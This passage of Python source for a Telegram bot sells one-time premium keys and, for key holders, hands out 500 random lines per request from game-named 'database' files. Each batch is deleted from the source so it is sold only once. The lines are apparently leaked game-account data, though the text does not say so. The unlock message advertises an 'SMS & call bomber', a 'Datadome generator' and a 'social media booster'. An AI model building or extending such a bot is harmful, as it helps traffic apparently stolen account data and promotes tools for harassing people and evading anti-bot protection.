            "𝚈𝚘𝚞 𝚠𝚒𝚕𝚕 𝚝𝚑𝚎𝚗 𝚋𝚎 𝚙𝚛𝚘𝚖𝚙𝚝𝚎𝚍 𝚏𝚘𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚏𝚘𝚛 *𝚎𝚊𝚌𝚑* 𝚘𝚏 𝚝𝚑𝚎𝚜𝚎 𝚔𝚎𝚢𝚜.\n\n"
            "💡 *𝙼𝚊𝚡 20 𝚔𝚎𝚢𝚜 𝚊𝚝 𝚘𝚗𝚌𝚎 𝚝𝚘 𝚊𝚟𝚘𝚒𝚍 𝚜𝚙𝚊𝚖.*"
        )
        keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
        else:
            await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
        return

    AWAITING_KEY_DURATION.add(user_id)
    message_text = (
        "🔑 **Generate New Access Key** 🔑\n\n"
        "Please send the *duration* for this key.\n"
        "✨ *Examples:*\n"
        "• `2m` for 2 minutes\n"
        "• `10m` for 10 minutes\n"
        "• `1h` for 1 hour\n"
        "• `1d` for 1 day\n"
        "• `3d` for 3 days\n"
        "• `7d` for 7 days\n"
        "• `lifetime` for permanent access\n\n"
        "💡 *Format*: Number followed by `m`, `h`, or `d` (e.g., `5d`)."
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_key_count(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_KEY_COUNT:
        return

    try:
        key_count = int(update.message.text.strip())
        if not (1 <= key_count <= 20):
            await update.message.reply_text("⚠️ Please enter a number between `1` and `20` for the key count.", parse_mode="Markdown")
            return
        
        context.user_data['keys_to_generate_count'] = key_count
        AWAITING_KEY_COUNT.discard(user_id)
        AWAITING_KEY_DURATION.add(user_id)

        message_text = (
            f"✅ You've chosen to generate *{key_count}* keys.\n\n"
            "Now, please send the *duration* for *each* of these keys.\n"
            "✨ *Examples:*\n"
            "• `2m` for 2 minutes\n"
            "• `10m` for 10 minutes\n"
            "• `1h` for 1 hour\n"
            "• `1d` for 1 day\n"
            "• `3d` for 3 days\n"
            "• `7d` for 7 days\n"
            "• `lifetime` for permanent access\n\n"
            "💡 *Format*: Number followed by `m`, `h`, or `d` (e.g., `5d`)."
        )
        keyboard = [[InlineKeyboardButton("⬅️ Cancel", callback_data="cancel_action")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

    except ValueError:
        await update.message.reply_text("❌ *Invalid input!* Please send a valid *number* for the key count.", parse_mode="Markdown")

async def handle_key_duration(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_KEY_DURATION:
        return

    duration_text = update.message.text.strip().lower()
    
    expires_at = None
    expiry_text = ""
    days = 0

    if duration_text == "lifetime":
        expires_at = None
        expiry_text = "**🌟 Lifetime**"
        days = 999999
    else:
        match = re.match(r"(\d+)([mdh])", duration_text)
        if not match:
            await update.message.reply_text("❌ *Invalid format!* Please use `Xd`, `Xh`, `Xm`, or `lifetime` (e.g., `3d`, `24h`, `60m`).", parse_mode="Markdown")
            return

        value = int(match[1])
        unit = match[2]
        
        delta = datetime.timedelta()
        if unit == 'd':
            delta = datetime.timedelta(days=value)
            expiry_text = f"**🗓️ {value} day{'s' if value != 1 else ''}**"
            days = value
        elif unit == 'h':
            delta = datetime.timedelta(hours=value)
            expiry_text = f"**⏰ {value} hour{'s' if value != 1 else ''}**"
            days = value / 24
        elif unit == 'm':
            delta = datetime.timedelta(minutes=value)
            expiry_text = f"**⏱️ {value} minute{'s' if value != 1 else ''}**"
            days = value / (24 * 60)

        expires_at = (datetime.datetime.now() + delta).timestamp()

    num_keys_to_generate = context.user_data.get('keys_to_generate_count', 1)

    generated_keys_output = []
    for _ in range(num_keys_to_generate):
        while True:
            key = f"{KEY_PREFIX}{random.randint(100000, 999999)}"
            if key not in ACCESS_KEYS and key not in USED_KEYS:
                break

        ACCESS_KEYS[key] = {
            "expires_at": expires_at,
            "days": days,
            "created_by": user_id,
            "created_at": datetime.datetime.now().isoformat()
        }
        generated_keys_output.append(f"`{key}`")
        logging.info(f"User {user_id} generated key {key} with {days} validity")
        
    save_access()

    if num_keys_to_generate > 1:
        key_message_header = f"🎉 **{num_keys_to_generate} Keys Generated Successfully!** 🎉\n\n"
        key_message_list = "\n".join(generated_keys_output)
        key_message_footer = (
            f"\n⏳ **𝚅𝚊𝚕𝚒𝚍𝚒𝚝𝚢 (𝚎𝚊𝚌𝚑):** {expiry_text}\n"
            f"📝 **𝚂𝚝𝚊𝚝𝚞𝚜:** One-time use\n"
            f"📅 **𝙲𝚛𝚎𝚊𝚝𝚎𝚍 𝙾𝚗:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"✨ *𝚂𝚑𝚊𝚛𝚎 𝚝𝚑𝚎𝚜𝚎 𝚔𝚎𝚢𝚜 𝚠𝚒𝚝𝚑 𝚢𝚘𝚞𝚛 𝚞𝚜𝚎𝚛𝚜 𝚝𝚘 𝚐𝚛𝚊𝚗𝚝 𝚝𝚑𝚎𝚖 𝚊𝚌𝚌𝚎𝚜𝚜!*"
        )
        key_message = key_message_header + key_message_list + key_message_footer
    else:
        key_message = (
            f"🎉 **𝙺𝙴𝚈 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙸𝙾𝙽 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻!**\n\n"
            f"🔑 **𝙺𝙴𝚈𝚂 𝙳𝙴𝚃𝙰𝙸𝙻𝚂**\n"
            f"┣ 🎫 **𝙰𝙲𝙲𝙴𝚂 𝙺𝙴𝚈**: `{generated_keys_output[0]}`\n"
            f"┣ ⏳ **𝚅𝙰𝙻𝙸𝙳**: {expiry_text}\n"
            f"┣ 📝 **𝚂𝚃𝙰𝚃𝚄𝚂**: ᴏɴᴇ-ᴛɪᴍᴇ ᴜsᴇ\n"
            f"┣ 📅 **𝙲𝚁𝙴𝙰𝚃𝙴𝙳**: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🛡️ **𝚂𝙴𝙲𝚄𝚁𝙸𝚃𝚈 𝙽𝙾𝚃𝙴𝚂**\n"
            f"┣ ✦ 𝚂𝙸𝙽𝙶𝙻𝙴-𝙰𝙲𝚃𝙸𝚅𝙸𝚃𝙾𝙽 𝙾𝙽𝙻𝚈\n"
            f"┣ ✦ 𝙰𝚄𝚃𝙾-𝙴𝚇𝙿𝙸𝚁𝚈 𝙴𝙽𝙰𝙱𝙻𝙴𝙳\n"
            f"┣ ✦ 𝙽𝙾𝙽-𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁𝙰𝙱𝙻𝙴\n\n"
            f"📤 **𝙳𝙸𝚂𝚃𝚁𝙸𝙱𝚄𝚃𝙸𝙾𝙽**\n"
            f"𝚂𝙷𝙰𝚁𝙴 𝚃𝙷𝙸𝚂 𝙺𝙴𝚈 𝚃𝙾 𝚈𝙾𝚄𝚁 𝙲𝙻𝙸𝙴𝙽𝚃 𝚃𝙾 𝙶𝙸𝚅𝙴 𝚃𝙷𝙴𝙼 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙰𝙲𝙲𝙴𝚂𝚂!"
        )

    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(key_message, reply_markup=reply_markup, parse_mode="Markdown")
    AWAITING_KEY_DURATION.discard(user_id)
    context.user_data.pop('keys_to_generate_count', None)

async def handle_enter_key(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_KEY_INPUT:
        return

    key = update.message.text.strip()
    
    if key in ACCESS_KEYS:
        key_data = ACCESS_KEYS[key]
        
        if key_data.get("days") == 999999:
            expires_at = None
            expiry_text = "**🌟 Lifetime Access**"
        else:
            days = key_data.get("days", 30)
            expires_at = (datetime.datetime.now() + datetime.timedelta(days=days)).timestamp()
            expiry_text = f"**🗓️ {days} day{'s' if days != 1 else ''}**"
        
        USER_ACCESS[user_id] = expires_at
        if user_id not in USER_STATS:
            USER_STATS[user_id] = {"generations": 0, "last_active": datetime.datetime.now().isoformat()}
       
        del ACCESS_KEYS[key]
        USED_KEYS.add(key)
        save_access()

        success_message = (
            f"🎉 **ᴀᴄᴄᴇss ɢʀᴀɴᴛᴇᴅ! ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ!** 🎉\n\n"
            f"✅ **sᴛᴀᴛᴜs**: ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!\n"
            f"⏳ **ᴠᴀʟɪᴅɪᴛʏ**: {expiry_text}\n\n"
            f"🚀 **ᴜɴʟᴏᴄᴋᴇᴅ ғᴇᴀᴛᴜʀᴇs**:\n"
            f"┣ 📂 **ᴅᴀᴛᴀʙᴀsᴇ ɢᴇɴᴇʀᴀᴛɪᴏɴ** (500 ᴘᴇʀ ʀᴇǫᴜᴇsᴛ)\n"
            f"┣ 🔍 **sᴇᴀʀᴄʜ & ғɪʟᴛᴇʀ** (ᴄᴏᴍɪɴɢ sᴏᴏɴ!)\n"
            f"┣ 📊 **ᴘᴇʀsᴏɴᴀʟ sᴛᴀᴛɪsᴛɪᴄs**\n"
            f"┣ 🔐 **ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛᴏʀ**\n"
            f"┣ 🛠️ **ᴜʀʟ & ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴇʀ**\n"
            f"┣ 🛡️ **ᴅᴀᴛᴀᴅᴏᴍᴇ ɢᴇɴᴇʀᴀᴛᴏʀ**\n"
            f"┣ 💣 **sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ**\n"
            f"┣ 🚀 **sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ**\n\n"
            f"✨ **ɢᴇᴛ sᴛᴀʀᴛᴇᴅ**: ᴛᴀᴘ '📂 ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs' ғʀᴏᴍ ᴛʜᴇ ᴍᴀɪɴ ᴍᴇɴᴜ!"
        )
        keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(success_message, reply_markup=reply_markup, parse_mode="Markdown")
        AWAITING_KEY_INPUT.discard(user_id)
        logging.info(f"User {user_id} activated key {key}")
        
    elif key in USED_KEYS:
        await update.message.reply_text(
            "❌ **ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!**\n\n"
            "🔐 **sᴇᴄᴜʀɪᴛʏ ʟᴏᴄᴋ**\n"
            "ᴛʜɪs ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ ʜᴀs ʙᴇᴇɴ ᴜsᴇᴅ ᴘʀᴇᴠɪᴏᴜsʟʏ.\n\n"
            "⚠️ **ᴘᴏʟɪᴄʏ ʀᴇᴍɪɴᴅᴇʀ**\n"
            "┣ ✦ ᴇᴀᴄʜ ᴋᴇʏ ɪs sɪɴɢʟᴇ-ᴜsᴇ ᴏɴʟʏ\n"
            "┣ ✦ ɴᴏɴ-ᴛʀᴀɴsғᴇʀᴀʙʟᴇ ᴀғᴛᴇʀ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ\n"
            "┣ ✦ ʀᴇᴀʟ-ᴛɪᴍᴇ ᴜsᴀɢᴇ ᴛʀᴀᴄᴋɪɴɢ\n\n"
            "🆕 **ɢᴇᴛ ɴᴇᴡ ᴀᴄᴄᴇss**\n"
            "ᴄᴏɴᴛᴀᴄᴛ: @Khatelynnnnnn ғᴏʀ ᴀ ɴᴇᴡ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ.",
            parse_mode="Markdown"
        )
        AWAITING_KEY_INPUT.discard(user_id)
    else:
        await update.message.reply_text(
            "❌ **𝙰𝙲𝙲𝙴𝚂 𝙳𝙴𝙽𝙸𝙴𝙳**\n\n"
            "🔍 **𝚅𝙴𝚁𝙸𝙵𝙸𝙲𝙰𝚃𝙸𝙾𝙽 𝙵𝙰𝙸𝙻𝙴𝙳**\n"
            "𝚃𝙷𝙴 𝙺𝙴𝚈 𝙳𝙸𝙳 𝙽𝙾𝚃 𝙿𝙰𝚂𝚂 𝙰𝚄𝚃𝙷𝙴𝙽𝚃𝙸𝙲𝙰𝚃𝙸𝙾𝙽.\n\n"
            "📝 **𝘾𝙊𝙍𝙍𝙀𝘾𝙏 𝙁𝙊𝙍𝙈𝘼𝙏**\n"
            "┣ ✦ `ᴋʜᴀᴛᴇʟʏɴᴘʀᴇᴍɪᴜᴍᴋᴇʏ-xxxxxx`\n"
            "┣ ✦ x = 6 ᴀʟᴘʜᴀɴᴜᴍᴇʀɪᴄ ᴄʜᴀʀᴀᴄᴛᴇʀs\n\n"
            "🛠️ **𝙏𝙧𝙮 𝙖𝙜𝙖𝙞𝙣*\n"
            "𝙳𝙾𝚄𝙱𝙻𝙴 𝙲𝙷𝙴𝙲𝙺 𝚈𝙾𝚄𝚁 𝙺𝙴𝚈.\n\n"
            "👨💻 **sᴜᴘᴘᴏʀᴛ**\n"
            "𝚌𝚘𝚗𝚝𝚊𝚌𝚝: @Khatelynnnnnn 𝙵𝙾𝚁 𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝙲𝙴.",
            parse_mode="Markdown"
        )

async def prompt_for_key(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await current_message.answer("🛠️ Bot is under maintenance!", show_alert=True)
            await current_message.edit_text(
                "🛠️ **The Bot Is In Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️ **The Bot Is In Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        return

    AWAITING_KEY_INPUT.add(user_id)
    message_text = (
        "— **🔐 ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ** —\n\n"
        "🎯 **ʀᴇǫᴜᴇsᴛɪɴɢ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ**\n"
        "ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴋᴇʏ ʙᴇʟᴏᴡ.\n\n"
        "📋 **ᴋᴇʏ ғᴏʀᴍᴀᴛ ɢᴜɪᴅᴇ**\n"
        "┣ ✦ ᴘᴀᴛᴛᴇʀɴ: `ᴋʜᴀᴛᴇʟʏɴᴘʀᴇᴍɪᴜᴍᴋᴇʏ-xxxxxx`\n"
        "┣ ✦ x = ᴀʟᴘʜᴀɴᴜᴍᴇʀɪᴄ ᴄʜᴀʀᴀᴄᴛᴇʀs\n"
        "┣ ✦ ʟᴇɴɢᴛʜ: 6-ᴄʜᴀʀᴀᴄᴛᴇʀ sᴜғғɪx\n\n"
        "💡 **ᴇxᴀᴍᴘʟᴇ ᴋᴇʏs**\n"
        "`ᴋʜᴀᴛᴇʟʏɴᴘʀᴇᴍɪᴜᴍᴋᴇʏ-123456`\n"
        "`ᴋʜᴀᴛᴇʟʏɴᴘʀᴇᴍɪᴜᴍᴋᴇʏ-abc789`\n\n"
        "🔓 **ɴᴇᴇᴅ ᴀᴄᴄᴇss?**\n"
        "ᴄᴏɴᴛᴀᴄᴛ @Khatelynnnnnn ᴛᴏ ᴀᴄǫᴜɪʀᴇ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ."
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴘʀᴇᴠɪᴏᴜs", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        await current_message.reply_text(
            message_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

# ========== DATABASE GENERATION FUNCTIONS ==========
async def generate_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message

    user_id = update.effective_user.id
    
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await current_message.answer("🛠️ Bot is under maintenance!", show_alert=True)
            await current_message.edit_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        return

    if not has_access(user_id):
        if update.callback_query:
            await current_message.answer("🔒 ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ!", show_alert=True)
            await current_message.edit_text(
                "🔒 **ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ!**\n\n"
                "ʏᴏᴜ ɴᴇᴇᴅ ᴀᴄᴛɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs. ᴘʟᴇᴀsᴇ ᴜsᴇ ᴀɴ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴀᴅᴍɪɴ ᴛᴏ ᴘᴜʀᴄʜᴀsᴇ ᴋᴇʏ.",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🔒 **ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ!**\n\n"
                "ʏᴏᴜ ɴᴇᴇᴅ ᴀᴄᴛɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs. ᴘʟᴇᴀsᴇ ᴜsᴇ ᴀɴ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴀᴅᴍɪɴ ᴛᴏ ᴘᴜʀᴄʜᴀsᴇ ᴋᴇʏ.",
                parse_mode="Markdown"
            )
        return

    keyboard = [[InlineKeyboardButton("🗄️ ᴄʜᴏᴏsᴇ ᴀ ᴅᴀᴛᴀʙᴀsᴇs", callback_data="database_menu")],
                [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    user_stats = USER_STATS.get(user_id, {})
    generations = user_stats.get("generations", 0)
    
    menu_text = (
        f"— **ᴅᴏᴍᴀɪɴs ɢᴇɴᴇʀᴀᴛɪᴏɴ sʏsᴛᴇᴍ** —\n\n"
        f"• *ʏᴏᴜʀ sᴛᴀᴛɪsᴛɪᴄs:*\n"
        f"➣ ᴛᴏᴛᴀʟ ɢᴇɴᴇʀᴀᴛɪᴏɴs: **{generations}**\n"
        f"➢ ʟɪɴᴇs ᴘᴇʀ ɢᴇɴᴇʀᴀᴛᴇ: **500**\n"
        f"➣ ᴀᴜᴛᴏ-ᴅᴇʟᴇᴛɪᴏɴ: **✦ ᴇɴᴀʙʟᴇᴅ** (ɢᴇɴᴇʀᴀᴛᴇᴅ ʟɪɴᴇs ᴀʀᴇ ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴛʜᴇ ᴅᴀᴛᴀʙᴀsᴇs)\n\n"
        f"▶︎ *ʀᴇᴀᴅʏ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ғɪʟᴇs!*"
    )
    
    if update.callback_query:
        await update.callback_query.message.edit_text(menu_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(menu_text, reply_markup=reply_markup, parse_mode="Markdown")

async def database_menu(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    current_message: Message = query.message
    
    if MAINTENANCE_MODE and query.from_user.id != ADMIN_ID:
        await current_message.edit_text(
            "🛠️ **The Bot Is Maintenance**\n\n"
            "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
            parse_mode="Markdown"
        )
        return

    db_stats, total_lines = get_database_stats()
    
    keyboard = []
    for db_name, file_path in DATABASE_FILES.items():
        button_text = f"{db_name} ({db_stats.get(db_name, 0):,} lines)"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"generate:{db_name}")])
    
    keyboard.append([InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴍᴇɴᴜ", callback_data="show_generate_menu")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    menu_text = (
        f"— **ᴅᴀᴛᴀʙᴀsᴇ sᴇʟᴇᴄᴛɪᴏɴ** —\n\n"
        f"📊 *ᴛᴏᴛᴀʟ ᴀᴠᴀɪʟᴀʙʟᴇ ʟɪɴᴇs*: **{total_lines:,}**\n"
        f"📄 *ʟɪɴᴇs ᴘᴇʀ ɢᴇɴᴇʀᴀᴛɪᴏɴ*: **500**\n"
        f"🔄 *ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ*: ʟɪɴᴇs ᴀʀᴇ ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴛʜᴇ sᴏᴜʀᴄᴇ ᴅᴀᴛᴀʙᴀsᴇ ᴀғᴛᴇʀ ɢᴇɴᴇʀᴀᴛɪᴏɴ.\n\n"
        f"ᴘʟᴇᴀsᴇ sᴇʟᴇᴄᴛ ᴀ ᴅᴀᴛᴀʙᴀsᴇ ғʀᴏᴍ ᴛʜᴇ ᴏᴘᴛɪᴏɴs ʙᴇʟᴏᴡ:"
    )
    
    await current_message.edit_text(menu_text, reply_markup=reply_markup, parse_mode="Markdown")

async def generate_file(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    current_message: Message = query.message

    user_id = query.from_user.id

    try:
        if MAINTENANCE_MODE and user_id != ADMIN_ID:
            await current_message.edit_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
            return

        if not has_access(user_id):
            await current_message.edit_text(
                "🔒 **Access Required!** You need premium access to generate files.",
                parse_mode="Markdown"
            )
            return

        _, game = query.data.split(":")
        file_path = DATABASE_FILES.get(game)

        if not file_path or not os.path.exists(file_path):
            await current_message.edit_text(
                f"❌ **Database Error!**\n\nThe database for *{game}* was not found or is unavailable. Please try another selection.",
                parse_mode="Markdown"
            )
            return

        if os.path.getsize(file_path) == 0:
            await current_message.edit_text(
                f"📭 **Database Empty!**\n\nThe *{game}* database currently has no lines available. Please select a different database.",
                parse_mode="Markdown"
            )
            return

        loading_steps = [
            "🔄 [25%] Accessing secure database nodes...",
            "🔗 [40%] Establishing encrypted connection...",
            "⚡ [55%] Processing data with AI algorithms...",
            "📊 [70%] Analyzing and filtering content...",
            "💎 [85%] Applying premium enhancements...",
            "🛡️ [95%] Final security verification...",
            "✅ [100%] Your premium file is ready!",
            "𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐅𝐑𝐎𝐌 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄",
            "𝚃𝙷𝙰𝙽𝙺𝚈𝙾𝚄 𝙵𝙾𝚁 𝚄𝚂𝙸𝙽𝙶 𝙼𝚈 𝙱𝙾𝚃🎊"
        ]

        message = await current_message.edit_text(loading_steps[0], parse_mode="Markdown")
        
        for step in loading_steps[1:]:
            try:
                await asyncio.sleep(0.8)
                await message.edit_text(step, parse_mode="Markdown")
            except BadRequest:
                pass

        with open(file_path, "r", encoding="utf-8", errors='ignore') as f:
            all_lines = [line.strip() for line in f if line.strip()]

        if not all_lines:
            await current_message.edit_text(
                f"📭 **No Data Available!**\n\nThe *{game}* database is currently empty. Please select another.",
                parse_mode="Markdown"
            )
            return

        lines_to_generate = min(500, len(all_lines))
        selected_lines = random.sample(all_lines, lines_to_generate)
        
        remaining_lines = [line for line in all_lines if line not in selected_lines]
        
        with open(file_path, "w", encoding="utf-8") as f:
            for line in remaining_lines:
                f.write(line + '\n')

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        clean_game_name = game.replace('🎮 ', '').replace('🔥 ', '').replace('💫 ', '').replace('🎃 ', '')
        result_filename = f"♨️ᴋʜᴀᴛᴇʟʏɴ_ᴘʀᴇᴍɪᴜᴍ_{clean_game_name}_{datetime.datetime.now().strftime('%m%d_%H%M')}.txt"
        result_filepath = GENERATED_DIR / result_filename

        with open(result_filepath, "w", encoding="utf-8") as f:
            f.write(f"♨️ {BOT_DISPLAY_NAME} Premium Database ♨️\n")
            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            f.write(f"📂 Source: {game}\n")
            f.write(f"📄 Lines: {lines_to_generate}\n")
            f.write(f"🕒 Generated: {timestamp}\n")
            f.write(f"🔥 Quality: Premium Grade\n")
            f.write(f"⚡ Auto-Delete: Enabled (lines removed from source)\n")
            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
            
            for i, line in enumerate(selected_lines, 1):
                f.write(f"{line}\n")

        with open(result_filepath, "rb") as f:
            caption = (
                "🔮 **✨ PREMIUM FILE GENERATED SUCCESSFULLY! ✨** 🔮\n\n"
                "📊 **GENERATION SUMMARY**\n"
                f"┣ 🎮 **Source Game**: `{game}`\n"
                f"┣ 📜 **Lines Generated**: `{lines_to_generate:,}`\n"
                f"┣ 🕐 **Generated On**: `{timestamp}`\n"
                f"┣ 💾 **Database Status**: `{len(remaining_lines):,}` lines available\n"
                f"┣ 🧹 **Cleanup Status**: ✅ Completed\n\n"
                "🛡️ **SECURITY & PRIVACY**\n"
                f"┣ 🔒 **Auto-Expiry**: 5 minutes\n"
                f"┣ 🗑️ **Auto-Deletion**: Enabled\n"
                f"┣ 🛡️ **Data Protection**: Active\n"
                f"┣ ⚡ **Secure Session**: Verified\n\n"
                "🚀 **NEXT STEPS**\n"
                "┣ ⬇️ **Download immediately**\n"
                "┣ ⏳ **File expires in 5:00**\n"
                "┣ 🔄 **Refresh for new generation**\n"
                "┣ 📚 **Manage your data securely**\n\n"
                "⭐ **Thank you for choosing Premium Service!**"
            )
            
            await context.bot.send_document(
                chat_id=query.message.chat_id,
                document=f,
                filename=result_filename,
                caption=caption,
                parse_mode="Markdown"
            )

        if user_id not in USER_STATS:
            USER_STATS[user_id] = {"generations": 0}
        USER_STATS[user_id]["generations"] += 1
        USER_STATS[user_id]["last_active"] = datetime.datetime.now().isoformat()
